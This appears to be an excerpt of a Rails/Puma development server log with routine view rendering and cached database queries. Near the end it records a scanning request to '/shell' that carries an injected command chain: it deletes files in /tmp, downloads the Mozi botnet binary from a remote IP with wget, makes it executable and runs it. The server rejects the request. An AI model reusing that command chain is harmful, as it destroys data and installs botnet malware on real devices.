  ↳ app/views/layouts/application.html.erb:12
[Webpacker] Everything's up-to-date. Nothing to do
  Rendered home/_header.html.erb (Duration: 0.6ms | Allocations: 233)
  Rendered layouts/_alerts.html.erb (Duration: 0.1ms | Allocations: 44)
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms6" = ? LIMIT ?[0m  [["adms6", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:40
  [1m[36mCACHE AdmSetting Load (0.0ms)[0m  [1m[34mSELECT "adm_settings".* FROM "adm_settings" WHERE "adm_settings"."adms7" = ? LIMIT ?[0m  [["adms7", 1], ["LIMIT", 1]]
  ↳ app/views/layouts/application.html.erb:43
  Rendered layout layouts/application.html.erb (Duration: 30.3ms | Allocations: 7966)
Completed 200 OK in 48ms (Views: 30.4ms | ActiveRecord: 1.7ms | Allocations: 11437)


Started GET "/shell?cd+/tmp;rm+-rf+*;wget+http://125.46.244.222:39978/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws" for 125.46.244.222 at 2021-05-28 22:13:04 -0600
Cannot render console from 125.46.244.222! Allowed networks: 127.0.0.0/127.255.255.255, ::1
  
ActionController::RoutingError (No route matches [GET] "/shell"):
  
- Gracefully stopping, waiting for requests to finish
=== puma shutdown: 2021-05-28 22:19:28 -0600 ===
- Goodbye!
Exiting
